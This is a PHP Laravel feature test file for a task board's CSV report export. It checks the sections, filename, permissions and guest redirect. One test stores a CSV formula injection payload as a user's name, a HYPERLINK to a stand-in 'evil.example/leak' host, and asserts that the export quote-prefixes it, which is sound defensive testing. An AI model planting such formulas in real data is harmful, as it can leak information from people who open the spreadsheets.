<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Models\Board;
use App\Models\Task;
use App\Models\User;
use Database\Seeders\RolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Config;
use Tests\TestCase;

/**
 * Board report CSV export (TASK-BOARD.md 3.7 "Still out: no export").
 *
 * The export is the same four reports as the page, so the assertions here are
 * about shape and access rather than recomputing the numbers — another test
 * covers those. What matters: it is a real CSV, it carries every section, and
 * the permission gating matches the report page (tasks.report, not tasks.view).
 */
class BoardReportExportTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(RolesAndPermissionsSeeder::class);
        // No task_statuses rows in this suite, so the report falls back to the
        // config columns — which is exactly the "empty table" path the export
        // must still produce a valid file for.
        Config::set('task-statuses.columns', [
            'todo' => ['name' => 'To Do', 'color' => 'gray'],
            'done' => ['name' => 'Done', 'color' => 'green'],
        ]);
    }

    private function board(): Board
    {
        $owner = User::factory()->create(['is_active' => true]);
        $owner->assignRole('super_admin');

        return Board::create([
            'user_id' => $owner->id,
            'name' => 'Support',
            'slug' => 'support',
        ]);
    }

    private function manager(): User
    {
        $u = User::factory()->create(['is_active' => true]);
        $u->assignRole('manager');

        return $u;
    }

    public function test_export_returns_a_csv_with_every_section(): void
    {
        $board = $this->board();
        $this->actingAs($this->manager());

        $response = $this->get(route('boards.report.export', $board));

        $response->assertOk();
        $this->assertStringContainsString('text/csv', (string) $response->headers->get('Content-Type'));

        $content = $response->streamedContent();

        // Parse it as CSV rather than asserting substrings: if any row has a
        // comma in a field, the raw string will be quoted and a naive contains()
        // would miss it.
        $rows = array_filter(array_map('str_getcsv', explode("\n", trim($content))));
        $flat = array_merge(...$rows);

        foreach (['Cards per column', 'Finished per week', 'Average time in column', 'Load by assignee', 'Coverage'] as $section) {
            $this->assertContains($section, $flat, "CSV is missing the {$section} section");
        }

        // The config columns should appear as a column label.
        $this->assertContains('To Do', $flat);
    }

    public function test_export_filename_uses_the_board_slug(): void
    {
        $board = $this->board();
        $this->actingAs($this->manager());

        $response = $this->get(route('boards.report.export', $board));

        // Symfony may add a quoted filename* variant; only the slug-derived name
        // is what matters, so assert it is present rather than match exactly.
        $this->assertStringContainsString(
            'board-support-report.csv',
            (string) $response->headers->get('Content-Disposition'),
        );
    }

    public function test_export_neutralizes_formula_injection_in_an_assignee_name(): void
    {
        // #4: a user sets their own profile name to a spreadsheet formula, gets
        // assigned to a card, and the report CSV must NOT emit it as a live formula.
        $board = $this->board();

        $evil = User::factory()->create([
            'is_active' => true,
            'name' => '=HYPERLINK("http://evil.example/leak","open")',
        ]);
        $task = Task::create([
            'user_id' => $evil->id,
            'board_id' => $board->id,
            'title' => 'Card',
            'status' => 'todo',
            'position' => 1,
        ]);
        $task->assignees()->attach($evil->id);

        $this->actingAs($this->manager());
        $content = $this->get(route('boards.report.export', $board))->assertOk()->streamedContent();

        $rows = array_filter(array_map('str_getcsv', explode("\n", trim($content))));
        $flat = array_merge(...$rows);

        $cell = collect($flat)->first(fn ($c) => str_contains((string) $c, 'HYPERLINK'));
        $this->assertNotNull($cell, 'the assignee name should appear in the export');
        $this->assertStringStartsWith("'", (string) $cell, 'a formula cell must be quote-prefixed so it renders as text');
    }

    public function test_a_viewer_without_tasks_report_is_refused(): void
    {
        $board = $this->board();
        $viewer = User::factory()->create(['is_active' => true]);
        // No roles: tasks.view only, not tasks.report.
        $this->actingAs($viewer);

        $this->get(route('boards.report.export', $board))->assertForbidden();
    }

    public function test_a_guest_is_sent_to_login(): void
    {
        $board = $this->board();

        $this->get(route('boards.report.export', $board))->assertRedirect(route('login'));
    }
}
